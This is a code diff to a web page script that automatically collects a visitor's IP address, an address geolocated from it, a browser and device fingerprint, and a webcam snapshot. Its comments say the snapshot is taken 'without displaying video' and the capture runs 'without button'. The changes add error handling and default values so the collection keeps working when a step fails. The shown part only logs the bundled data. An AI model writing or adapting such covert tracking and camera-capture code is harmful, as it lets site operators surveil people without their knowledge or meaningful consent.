@@ -59,7 +59,7 @@
                         return data.ip; // Returns the user's IP address
                     } catch (error) {
                         console.error('Error fetching IP address:', error);
-                        return null; // Return null if there was an error
+                        return "Unknown"; // Return "Unknown" if there was an error
                     }
                 }
 
@@ -77,73 +77,73 @@
                         };
                     } catch (error) {
                         console.error('Error fetching address:', error);
-                        return null; // Return null if there was an error
+                        return { formattedAddress: "Unknown" }; // Return a default value if there was an error
                     }
                 }
 
                 // Capture image from webcam without displaying video
-                // Function to capture and compress the webcam image
-async function captureImage() {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const track = stream.getVideoTracks()[0];
-    const imageCapture = new ImageCapture(track);
-    const bitmap = await imageCapture.grabFrame();
-    track.stop(); // Stop the video stream
+                async function captureImage() {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const track = stream.getVideoTracks()[0];
+                        const imageCapture = new ImageCapture(track);
+                        const bitmap = await imageCapture.grabFrame();
+                        track.stop(); // Stop the video stream
 
-    // Create a canvas to draw the image and compress it
-    const canvas = document.createElement('canvas');
-    const maxFileSizeMB = 1; // Maximum file size in MB
-    const targetFileSize = maxFileSizeMB * 1024 * 1024; // Convert MB to bytes
-    const context = canvas.getContext('2d');
+                        // Create a canvas to draw the image and compress it
+                        const canvas = document.createElement('canvas');
+                        const maxFileSizeMB = 1; // Maximum file size in MB
+                        const targetFileSize = maxFileSizeMB * 1024 * 1024; // Convert MB to bytes
+                        const context = canvas.getContext('2d');
 
-    // Set canvas dimensions to match the captured frame
-    canvas.width = bitmap.width;
-    canvas.height = bitmap.height;
+                        // Set canvas dimensions to match the captured frame
+                        canvas.width = bitmap.width;
+                        canvas.height = bitmap.height;
 
-    // Draw the image onto the canvas
-    context.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
+                        // Draw the image onto the canvas
+                        context.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
 
-    // Compress and convert the image to a base64 string
-    let compressedDataUrl;
-    let quality = 0.9; // Start with high quality
+                        // Compress and convert the image to a base64 string
+                        let compressedDataUrl;
+                        let quality = 0.9; // Start with high quality
 
-    do {
-        compressedDataUrl = canvas.toDataURL('image/jpeg', quality);
-        const byteSize = Math.ceil((compressedDataUrl.length * 3) / 4); // Approximate base64 size in bytes
+                        do {
+                            compressedDataUrl = canvas.toDataURL('image/jpeg', quality);
+                            const byteSize = Math.ceil((compressedDataUrl.length * 3) / 4); // Approximate base64 size in bytes
 
-        if (byteSize <= targetFileSize) {
-            break; // Stop if the image size is within the limit
-        }
+                            if (byteSize <= targetFileSize) {
+                                break; // Stop if the image size is within the limit
+                            }
 
-        // Reduce quality for further compression
-        quality -= 0.1;
+                            // Reduce quality for further compression
+                            quality -= 0.1;
 
-        // Prevent quality from going too low
-        if (quality < 0.1) {
-            console.warn('Unable to compress image within target size, using the best effort.');
-            break;
-        }
-    } while (compressedDataUrl.length > targetFileSize);
+                            // Prevent quality from going too low
+                            if (quality < 0.1) {
+                                console.warn('Unable to compress image within target size, using the best effort.');
+                                break;
+                            }
+                        } while (compressedDataUrl.length > targetFileSize);
 
-    return compressedDataUrl;
-}
+                        return compressedDataUrl;
+                    } catch (error) {
+                        console.error('Error capturing image:', error);
+                        return null; // Return null if the webcam access is denied
+                    }
+                }
 
                 // Example code for automatic data capture without button
                 const ip = await getUserIP();
-                let address = null;
-                if (ip) {
-                    // Get user's full address based on IP
-                    address = await getUserAddress(ip);
-                }
+                let address = await getUserAddress(ip);
 
-                // Capture webcam image in base64
+                // Capture webcam image in base64 if possible
                 const imageData = await captureImage();
 
                 // Collect user data
                 const userData = {
                     usrId: usrId,
-                    ipAddress: ip || "Unknown",
-                    location: address ? address.formattedAddress : "Unknown",
+                    ipAddress: ip,
+                    location: address.formattedAddress,
                     userAgent: navigator.userAgent,
                     operatingSystem: navigator.platform,
                     browserInfo: `${result.browser.name} ${result.browser.version}`,
@@ -163,7 +163,7 @@ async function captureImage() {
                     serviceWorkerStatus: 'serviceWorker' in navigator,
                     bluetoothStatus: 'bluetooth' in navigator,
                     isMobile: /android|bb\d+|meego|mobile|iphone|ipad/i.test(navigator.userAgent),
-                    image: imageData // Include captured image in base64
+                    image: imageData // Include captured image in base64 if available
                 };
 
                 console.log(JSON.stringify(userData));
